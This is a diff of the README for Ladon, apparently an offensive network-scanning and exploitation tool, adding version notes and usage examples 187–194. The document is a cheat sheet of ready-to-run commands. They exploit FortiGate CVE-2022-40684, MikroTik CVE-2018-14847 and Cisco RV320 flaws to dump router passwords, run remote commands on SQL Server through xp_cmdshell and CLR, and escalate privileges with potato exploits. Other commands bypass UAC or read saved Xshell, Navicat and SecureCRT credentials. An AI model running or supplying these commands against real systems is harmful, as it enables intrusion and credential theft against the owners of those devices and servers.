@@ -5,8 +5,8 @@ Windows版本: .Net、Cobalt Strike、PowerShell
 PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon 10.1 20221220
-简明用法例子 186例
+Ladon 10.6 20230202
+简明用法例子 194例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
@@ -52,7 +52,7 @@ Ladon domain.txt ICMP
 ##### 008 ICMP批量扫描机器是否存活
 Ladon host.txt ICMP
 
-##### 009 WhatCMS批量识别URL列表CMS识别、Banner、SSL证书、标题
+##### 009 WhatCMS批量识别CMS、Banner、SSL证书、标题，可识别未知CMS、路由器、打印机、网络设备、摄像头等
 Ladon 192.168.1.8 WhatCMS   扫描IP
 Ladon 192.168.1.8/24 WhatCMS   扫描C段
 Ladon 192.168.1.8/C WhatCMS   扫描C段
@@ -589,7 +589,7 @@ Ladon web 80 dir
 获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg)
 http://192.168.1.8/ip.txt
 
-##### 147 getstr/getb64/debase64(无回显漏洞回显结果)
+##### 147 getstr/getb64/debase64/savetxt(无回显漏洞回显结果)
 监听 Ladon web 800
 
 提交 返回明文
@@ -700,9 +700,9 @@ Ladon IISdoor http://192.168.1.142 SIMPLEPASS whoami
 Ladon FindIP ipc.txt ISVUL.txt		 (精确搜索)
 Ladon FindIP ipc.txt ISVUL.txt like  (模糊搜索)
 
-##### 171 CiscoDump CVE-2019-1653 Cisco RV320 RV325 Dump Password
-Ladon https://192.168.1.8 CiscoDump
-Ladon url.txt CiscoDump 批量探测Cisco漏洞并导出用户密码
+##### 171 CiscoPwd CVE-2019-1653 Cisco RV320 RV325 路由器密码读取
+Ladon https://192.168.1.8 CiscoPwd
+Ladon url.txt CiscoPwd 批量探测Cisco漏洞并导出用户密码
 
 ##### 172 PrinterPoc  打印机PJL任意代码执行漏洞批量检测
 Ladon 192.168.1.8 PrinterPoc
@@ -771,7 +771,7 @@ Ladon40 BypassUAC11 cmd
 Ladon40 BypassUAC11 c:\1.bat
 Ladon40 BypassUAC11 c:\1.exe
 
-##### 185 GetPwd支持Navicat、TeamView、Xshell、SecureCRT密码获取
+##### 185 GetPwd支持Navicat、TeamView、Xshell、SecureCRT密码读取
 Ladon GetPwd	   
 
 ##### 186 DraytekScan 密码审计Draytek弱口令检测
@@ -779,3 +779,47 @@ Ladon 192.168.1.8 DraytekScan
 Ladon https://192.168.1.8 DraytekScan
 Ladon 192.168.1.8/24 DraytekScan
 Ladon url.txt DraytekScan
+
+##### 187 XshellPwd Xshell密码读取
+Ladon XshellPwd
+
+##### 188 ForiGate CVE-2022-40684 未授权写SSH-KEY admin admin123
+Ladon 192.168.1.8 CVE-2022-40684
+Ladon https://192.168.1.8 CVE-2022-40684
+Ladon 192.168.1.8/24 CVE-2022-40684
+Ladon url.txt CVE-2022-40684
+
+##### 189 MssqlCmd  SQL Server远程执行命令 SQL版本、OS信息 xp_cmdshell
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master info  
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master open_cmdshell
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master xp_cmdshell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master r_shell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master ws_shell whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master py_cmdshell whoami
+
+##### 190 MssqlCmd SQL Server远程执行命令 efspotato、badpotato提权
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master install_clr
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master uninstall_clr
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_exec whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_efspotato whoami
+Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_badpotato whoami
+
+##### 191 CVE-2018-14847 Mikrotik RouterOS 6.29-6.42版本密码读取
+Ladon 192.168.1.8 CVE-2018-14847
+Ladon ip.txt CVE-2018-14847
+
+##### 192 ZteScan 中兴路由器光猫Web默认口令检测
+Ladon 192.168.1.8 ZteScan
+Ladon ip.txt ZteScan
+Ladon http://192.168.1.8 ZteScan
+Ladon url.txt ZteScan
+
+##### 193 MSNSwitchPwd CVE-2022-32429 MSNSwitch路由器密码读取
+Ladon https://192.168.1.8 MSNSwitchPwd
+Ladon url.txt MSNSwitchPwd 批量探测MSNSwitch漏洞并导出用户密码
+
+##### 194 NetGearPwd NetGear DGND3700v2路由器密码读取
+Ladon https://192.168.1.8 NetGearPwd
+Ladon url.txt NetGearPwd 批量NetGear漏洞导出用户密码
+
+=======================================================
